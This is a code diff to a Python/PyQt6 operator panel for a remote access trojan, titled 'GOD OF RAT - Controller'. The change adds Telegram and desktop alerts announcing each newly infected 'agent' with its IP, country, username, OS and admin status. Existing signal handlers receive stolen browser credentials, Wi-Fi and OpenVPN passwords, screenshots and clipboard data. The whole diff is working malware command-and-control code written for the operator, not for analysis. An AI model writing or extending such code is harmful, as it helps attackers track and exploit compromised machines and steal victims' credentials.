@@ -230,7 +230,7 @@ class TelegramBotManager:
 
         self.main_window.refresh_bot_list()
 
-    def add_bot(self, token, bot_name, allowed_users=None, proxy_url=None, proxy_port=None):
+    def add_bot(self, token, bot_name, allowed_users=None, proxy_url=None, proxy_port=None, notify_new_agents=True):
 
         if token in self.bots:
             return False, "Bot already exists"
@@ -280,6 +280,7 @@ class TelegramBotManager:
 
             
             application = builder.build()
+            bot_loop = asyncio.new_event_loop()
             
             application.add_handler(CommandHandler("start", self.make_start_handler(token)))
             application.add_handler(CommandHandler("help", self.make_help_handler(token)))
@@ -298,7 +299,6 @@ class TelegramBotManager:
             application.add_handler(MessageHandler(filters.COMMAND, unknown_handler))
             
             def run_bot():
-                bot_loop = asyncio.new_event_loop()
                 asyncio.set_event_loop(bot_loop)
                 try:
                     print(f"[*] Starting bot {bot_name} (polling)...")
@@ -315,15 +315,17 @@ class TelegramBotManager:
             thread = threading.Thread(target=run_bot, daemon=True)
             thread.start()
             
-
+            
             self.bots[token] = {
                 'application': application,
+                'loop': bot_loop,         
                 'name': bot_name,
                 'agents': {},
                 'users': allowed_users or [],
                 'token': token,
                 'proxy': proxy_url,
-                'synced': True  
+                'synced': True,
+                'notify_new_agents': notify_new_agents
             }
             
 
@@ -364,6 +366,10 @@ class TelegramBotManager:
             return False
         
         app = self.bots[token]['application']
+        loop = self.bots[token].get('loop')
+        if not loop or loop.is_closed():
+            print(f"[ERROR] Bot loop for {token} not available")
+            return False
         
         async def send():
             try:
@@ -374,19 +380,61 @@ class TelegramBotManager:
                     await app.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(document_bytes), filename=filename))
                 else:
                     await app.bot.send_message(chat_id=chat_id, text=text, parse_mode='HTML')
-                return True
             except Exception as e:
                 print(f"Telegram send error: {e}")
-                return False
         
-        try:
-            loop = self._get_or_create_loop()
-            future = asyncio.run_coroutine_threadsafe(send(), loop)
-            return future.result(timeout=15)
-        except Exception as e:
-            print(f"Failed to send message: {e}")
-            return False
-    
+
+        asyncio.run_coroutine_threadsafe(send(), loop)
+        return True
+
+    def send_new_agent_notification(self, agent_id, agent_name, agent_ip, 
+                                    agent_os, agent_user, is_admin, geo):
+        print(f"[DEBUG] Sending new agent notification: {agent_name} | Bots: {len(self.bots)}")
+        admin_flag = "<b>ADMIN</b>" if is_admin else "USER"
+        flag_icon = self.get_flag_emoji(geo.get('country_code', ''))
+        
+        message = (
+            f"🟢NEW AGENT CONNECTED!\n\n"
+            f"Name: <code>{agent_name}</code>\n"
+            f"IP: <code>{agent_ip}</code> {flag_icon}\n"
+            f"User: <code>{agent_user}</code>\n"
+            f"OS: <code>{agent_os[:40]}</code>\n"
+            f"Privileges: {admin_flag}\n\n"
+        )
+        
+
+        for token, bot_info in self.bots.items():
+            print(f"[DEBUG] Checking bot {bot_info['name']}, notify={bot_info.get('notify_new_agents', True)}")
+            allowed_users = bot_info.get('users', [])
+            
+            if not allowed_users:
+                continue
+            
+
+            if not bot_info.get('notify_new_agents', True):
+                continue
+            
+            for user_id in allowed_users:
+                try:
+
+                    self.send_message(token, user_id, message)
+                except Exception as e:
+                    print(f"Failed to send notification to {user_id}: {e}")
+
+    def get_flag_emoji(self, country_code):
+        """Возвращает emoji флага по коду страны"""
+        if not country_code or len(country_code) != 2:
+            return "🌍"
+        
+        flags = {
+            'US': '🇺🇸', 'GB': '🇬🇧', 'RU': '🇷🇺', 'DE': '🇩🇪',
+            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'CN': '🇨🇳',
+            'JP': '🇯🇵', 'KR': '🇰🇷', 'BR': '🇧🇷', 'IN': '🇮🇳',
+            'CA': '🇨🇦', 'AU': '🇦🇺', 'NL': '🇳🇱', 'PL': '🇵🇱',
+            'UA': '🇺🇦', 'BY': '🇧🇾', 'KZ': '🇰🇿'
+        }
+        return flags.get(country_code.upper(), '🌍')
+
     def send_document(self, token, chat_id, file_bytes, filename):
 
         if token not in self.bots:
@@ -522,7 +570,25 @@ class TelegramBotManager:
 
         return [{'token': t, 'name': b['name'], 'agents_count': len(b['agents'])} 
                 for t, b in self.bots.items()]
-    
+
+
+    def update_bot_settings(self, token, name=None, users=None, proxy=None, notify=None):
+        """Обновляет настройки бота без его перезапуска."""
+        if token not in self.bots:
+            return False
+        bot = self.bots[token]
+        if name is not None:
+            bot['name'] = name
+        if users is not None:
+            bot['users'] = users
+        if proxy is not None:
+            bot['proxy'] = proxy
+        if notify is not None:
+            bot['notify_new_agents'] = notify
+        # Сохраняем изменения на диск
+        self.save_bots()
+        return True
+
     def make_start_handler(self, token):
         async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_id = update.effective_user.id
@@ -1182,7 +1248,8 @@ class WebSocketClient(QThread):
     openvpn_creds_result = pyqtSignal(list, str, str)
     openvpn_creds_status = pyqtSignal(str, str)
     wifi_passwords_result = pyqtSignal(list, str, str)
-    task_details_received = pyqtSignal(dict, str)  
+    task_details_received = pyqtSignal(dict, str)
+    agent_notification_received = pyqtSignal(dict)
     wifi_passwords_status = pyqtSignal(str, str)    
     bots_list_received = pyqtSignal(list)
     browser_creds_result = pyqtSignal(list, str, str)
@@ -1343,7 +1410,8 @@ class WebSocketClient(QThread):
                 self.frame_received.emit(base64.b64decode(data["data"]), aid, monitor)
             elif msg_type == "screenshot": 
                 self.screenshot_received.emit(base64.b64decode(data["data"]), aid)
-            
+            elif msg_type == "agent_connected_notification":
+                self.agent_notification_received.emit(data)
             elif msg_type == "openvpn_creds_result": 
                 self.openvpn_creds_result.emit(data.get("data", []), data.get("status", ""), aid)
             elif msg_type == "openvpn_creds_status": 
@@ -7479,10 +7547,37 @@ class MainWindow(QMainWindow):
         self.ws.monitors_received.connect(self.distribute_monitors)
         self.ws.clipboard_received.connect(self.distribute_clipboard)
         self.ws.active_window_received.connect(self.distribute_active_window)
+        self.ws.agent_notification_received.connect(self.on_agent_notification_received)
         
         self.ws.start()
         
+    def on_agent_notification_received(self, data):
+        print("[DEBUG] === GOT AGENT NOTIFICATION ===")
+        agent_id = data.get("agent_id")
+        agent_name = data.get("agent_name", "Unknown")
+        agent_ip = data.get("agent_ip", "?")
+        agent_os = data.get("agent_os", "?")
+        agent_user = data.get("agent_user", "?")
+        is_admin = data.get("is_admin", False)
+        geo = data.get("geo", {})
 
+
+        self.show_agent_notification(
+            agent_id, agent_name, agent_ip, 
+            agent_os, agent_user, is_admin, geo
+        )
+        
+
+        if hasattr(self, 'telegram_manager') and self.telegram_manager:
+            self.telegram_manager.send_new_agent_notification(
+                agent_id=agent_id,
+                agent_name=agent_name,
+                agent_ip=agent_ip,
+                agent_os=agent_os,
+                agent_user=agent_user,
+                is_admin=is_admin,
+                geo=geo
+            )
     def add_agent_tab_with_close(self, widget, title, agent_id):
 
         index = self.agent_tabs_container.addTab(widget, title)
@@ -7521,6 +7616,171 @@ class MainWindow(QMainWindow):
         return index
 
 
+    def show_bot_options_dialog(self):
+
+        index = self.bot_combo.currentIndex()
+        if index < 0 or self.bot_combo.count() == 0:
+            QMessageBox.warning(self, "No Bot", "Please select a bot first.")
+            return
+        token = self.bot_combo.itemData(index)
+        if not token or token not in self.telegram_manager.bots:
+            QMessageBox.warning(self, "No Bot", "Selected bot not found.")
+            return
+        bot_info = self.telegram_manager.bots[token]
+
+        dialog = QDialog(self)
+        dialog.setWindowTitle(f"Bot Options - {bot_info['name']}")
+        dialog.setModal(True)
+        dialog.setMinimumWidth(450)
+        layout = QVBoxLayout(dialog)
+        layout.setSpacing(10)
+
+        layout.addWidget(QLabel("Bot Name:"))
+        name_edit = QLineEdit(bot_info['name'])
+        layout.addWidget(name_edit)
+
+
+        layout.addWidget(QLabel("API Token:"))
+        token_layout = QHBoxLayout()
+        token_edit = QLineEdit(bot_info['token'])
+        token_edit.setEchoMode(QLineEdit.EchoMode.Password)
+        token_edit.setReadOnly(True)
+        token_layout.addWidget(token_edit)
+        show_token_check = QCheckBox("Show")
+        show_token_check.toggled.connect(
+            lambda checked: token_edit.setEchoMode(
+                QLineEdit.EchoMode.Normal if checked else QLineEdit.EchoMode.Password
+            )
+        )
+        token_layout.addWidget(show_token_check)
+        layout.addLayout(token_layout)
+
+
+        layout.addWidget(QLabel("Authorized Users (Telegram IDs):"))
+
+
+        users_list = QListWidget()
+        users_list.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
+
+        users_list.setStyleSheet("""
+            QListWidget {
+                background-color: #0a0a0a;
+                border: 1px solid #444444;
+                font-family: 'Consolas';
+                font-size: 11px;
+                outline: none;
+            }
+            QListWidget::item {
+                padding: 6px 10px;
+                border: 1px solid transparent;
+                margin: 1px 0px;
+            }
+            QListWidget::item:selected {
+                background-color: transparent;
+                border: 1px solid #8B0000;
+                color: #ffffff;
+            }
+            QListWidget::item:hover {
+                background-color: #1a1a1a;
+                border: 1px solid #333333;
+            }
+            QListWidget::item:selected:!active {
+                background-color: transparent;
+                border: 1px solid #8B0000;
+                color: #ffffff;
+            }
+        """)
+
+
+        for uid in bot_info.get('users', []):
+            users_list.addItem(str(uid))
+        layout.addWidget(users_list)
+
+        users_buttons = QHBoxLayout()
+        add_user_btn = QPushButton("Add")
+        remove_user_btn = QPushButton("Remove")
+        users_buttons.addWidget(add_user_btn)
+        users_buttons.addWidget(remove_user_btn)
+        layout.addLayout(users_buttons)
+
+
+        layout.addWidget(QLabel("Proxy URL:"))
+        proxy_edit = QLineEdit(bot_info.get('proxy', ''))
+        proxy_edit.setPlaceholderText("http://user:pass@host:port/")
+        layout.addWidget(proxy_edit)
+
+
+        notify_check = QCheckBox("Send notifications about new agents")
+        notify_check.setChecked(bot_info.get('notify_new_agents', True))
+        layout.addWidget(notify_check)
+
+        btn_layout = QHBoxLayout()
+        save_btn = QPushButton("Save")
+        cancel_btn = QPushButton("Cancel")
+        btn_layout.addWidget(save_btn)
+        btn_layout.addWidget(cancel_btn)
+        layout.addLayout(btn_layout)
+
+
+        def add_user():
+            user_id, ok = QInputDialog.getText(
+                dialog, 
+                "Add User", 
+                "Enter Telegram ID (number):"
+            )
+            if ok and user_id.strip():
+                try:
+                    uid = int(user_id.strip())
+                    if uid > 0:
+                        items = [int(users_list.item(i).text()) for i in range(users_list.count())]
+                        if uid not in items:
+                            users_list.addItem(str(uid))
+                    else:
+                        QMessageBox.warning(dialog, "Error", "ID must be positive.")
+                except ValueError:
+                    QMessageBox.warning(dialog, "Error", "Please enter a valid number.")
+
+
+        def remove_user():
+            for item in users_list.selectedItems():
+                users_list.takeItem(users_list.row(item))
+
+        add_user_btn.clicked.connect(add_user)
+        remove_user_btn.clicked.connect(remove_user)
+
+        def on_save():
+            new_name = name_edit.text().strip()
+            if not new_name:
+                QMessageBox.warning(dialog, "Error", "Bot name cannot be empty.")
+                return
+
+            new_users = []
+            for i in range(users_list.count()):
+                try:
+                    uid = int(users_list.item(i).text())
+                    new_users.append(uid)
+                except ValueError:
+                    pass
+
+            new_proxy = proxy_edit.text().strip()
+            new_notify = notify_check.isChecked()
+
+            self.telegram_manager.update_bot_settings(
+                token=token,
+                name=new_name,
+                users=new_users,
+                proxy=new_proxy,
+                notify=new_notify
+            )
+            self.refresh_bot_list()
+            self.sync_bots_with_server()
+            dialog.accept()
+
+        save_btn.clicked.connect(on_save)
+        cancel_btn.clicked.connect(dialog.reject)
+
+        dialog.exec()
+
     def on_extract_icon_clicked(self, dialog, preview_label, path_label, clear_btn, icon_path_container):
         file_path, _ = QFileDialog.getOpenFileName(dialog, "Select EXE to Extract Icon", "", "Executable files (*.exe);;All files (*.*)")
         if not file_path:
@@ -7543,6 +7803,71 @@ class MainWindow(QMainWindow):
                 preview_label.setText("")
         else:
             QMessageBox.warning(dialog, "Extraction Failed", "Could not extract icon from the selected file.")
+
+    def show_agent_notification(self, agent_id, agent_name, agent_ip, 
+                                agent_os, agent_user, is_admin, geo):
+        
+        from PyQt6.QtWidgets import QSystemTrayIcon
+        from PyQt6.QtCore import QTimer
+        from PyQt6.QtGui import QIcon
+        
+        if not hasattr(self, 'tray_icon'):
+            self.tray_icon = QSystemTrayIcon(self)
+            icon_path = resource_path(os.path.join("icons", "rat_ico.png"))
+            if os.path.exists(icon_path):
+                self.tray_icon.setIcon(QIcon(icon_path))
+            else:
+                self.tray_icon.setIcon(self.windowIcon())
+            self.tray_icon.setToolTip("GOD OF RAT - Controller")
+            self.tray_icon.show()
+        
+        admin_tag = " ADMIN" if is_admin else " USER"
+        flag = self.get_flag_emoji(geo.get('country_code', ''))
+        
+        title = f" New Agent Connected!"
+        
+        message = f"""
+        {agent_name}
+        ━━━━━━━━━━━━━━━━━━━━━
+         IP: {agent_ip} {flag}
+         User: {agent_user}
+         OS: {agent_os[:30]}
+         {admin_tag}
+        """
+        
+
+        self.tray_icon.showMessage(
+            title, 
+            message,
+            QSystemTrayIcon.MessageIcon.Information,
+            5000  
+        )
+        
+
+        self.status.showMessage(f"[+] New agent: {agent_name} ({agent_ip})", 5000)
+        
+
+        try:
+            import winsound
+            winsound.MessageBeep(winsound.MB_ICONASTERISK)
+        except:
+            pass
+
+    def get_flag_emoji(self, country_code):
+        """Возвращает emoji флага по коду страны"""
+        if not country_code or len(country_code) != 2:
+            return "🌍"
+        
+
+        flags = {
+            'US': '🇺🇸', 'GB': '🇬🇧', 'RU': '🇷🇺', 'DE': '🇩🇪',
+            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'CN': '🇨🇳',
+            'JP': '🇯🇵', 'KR': '🇰🇷', 'BR': '🇧🇷', 'IN': '🇮🇳',
+            'CA': '🇨🇦', 'AU': '🇦🇺', 'NL': '🇳🇱', 'PL': '🇵🇱',
+            'UA': '🇺🇦', 'BY': '🇧🇾', 'KZ': '🇰🇿', 'IL': '🇮🇱'
+        }
+        return flags.get(country_code.upper(), '🌍')
+
 
     def on_bots_list_received(self, bots_list):
 
@@ -8378,7 +8703,6 @@ class MainWindow(QMainWindow):
                 QMessageBox.warning(self, "Unlink Failed", "Failed to unlink any agents")
 
     def init_telegram_bar(self):
-
         telegram_bar = QFrame()
         telegram_bar.setStyleSheet("""
             QFrame {
@@ -8411,26 +8735,22 @@ class MainWindow(QMainWindow):
         layout = QHBoxLayout(telegram_bar)
         layout.setContentsMargins(10, 5, 10, 5)
         
-
         title = QLabel("TELEGRAM BOTS")
         title.setStyleSheet("font-weight: bold; color: #aa7a3c; font-size: 12px;")
         layout.addWidget(title)
         
-
         self.bot_combo = QComboBox()
         self.bot_combo.setMinimumWidth(200)
         self.bot_combo.setStyleSheet("background-color: #0a0a0a; border: 1px solid #444444; padding: 4px;")
         self.bot_combo.currentIndexChanged.connect(self.on_bot_selected)
         layout.addWidget(self.bot_combo)
         
-
         self.bot_status_label = QLabel("⚪ No bot selected")
         self.bot_status_label.setStyleSheet("color: #888888; font-size: 10px;")
         layout.addWidget(self.bot_status_label)
         
         layout.addStretch()
         
-
         add_btn = QPushButton("+ ADD BOT")
         add_btn.clicked.connect(self.show_add_bot_dialog)
         layout.addWidget(add_btn)
@@ -8439,10 +8759,11 @@ class MainWindow(QMainWindow):
         remove_btn.clicked.connect(self.remove_selected_bot)
         layout.addWidget(remove_btn)
         
-        refresh_btn = QPushButton("REFRESH")
-        refresh_btn.clicked.connect(self.refresh_bot_list)
-        refresh_btn.setToolTip("Refresh bot list")
-        layout.addWidget(refresh_btn)
+
+        options_btn = QPushButton("OPTIONS")
+        options_btn.clicked.connect(self.show_bot_options_dialog)
+        layout.addWidget(options_btn)
+
         
         return telegram_bar
     
@@ -8609,6 +8930,28 @@ class MainWindow(QMainWindow):
         layout.addWidget(users_input)
         
 
+
+        self.notify_checkbox = QCheckBox("Send notifications about new agents")
+        self.notify_checkbox.setChecked(True)
+        self.notify_checkbox.setStyleSheet("""
+            QCheckBox {
+                color: #d0d0d0;
+                font-family: 'Segoe UI', Arial, sans-serif;
+                font-size: 11px;
+            }
+            QCheckBox::indicator {
+                width: 14px;
+                height: 14px;
+                border: 1px solid #333333;
+                background-color: #0a0a0a;
+            }
+            QCheckBox::indicator:checked {
+                background-color: #8B0000;
+                border-color: #8B0000;
+            }
+        """)
+        layout.addWidget(self.notify_checkbox)
+
         proxy_group = QGroupBox("Proxy Settings (required for blocked regions)")
         proxy_group.setCheckable(True)
         proxy_group.setChecked(True)  
@@ -8663,7 +9006,7 @@ class MainWindow(QMainWindow):
                     QMessageBox.warning(dialog, "Error", "Please enter proxy URL or disable proxy")
                     return
             
-            success, msg = self.telegram_manager.add_bot(token, name, allowed_users, proxy_url, None)
+            success, msg = self.telegram_manager.add_bot(token, name, allowed_users, proxy_url, None, notify_new_agents=self.notify_checkbox.isChecked())
             if success:
                 self.bot_status_label.setText("🟢 Bot active")
                 self.bot_status_label.setStyleSheet("color: #00aa00; font-size: 10px;")
@@ -9336,7 +9679,7 @@ class MainWindow(QMainWindow):
                         token = session.get('token')
                         if token and chat_id:
 
-                            msg = f"<b>System Info for {data.get('name', agent_id[:8])}</b>\n\n"
+                            msg = f"<b>System Info for {data.get('name')}</b>\n\n"
                             msg += f"<b>OS:</b> {data.get('os', 'N/A')}\n"
                             msg += f"<b>Arch:</b> {data.get('arch', 'N/A')}\n"
                             msg += f"<b>CPU:</b> {data.get('processor', 'N/A')}\n"
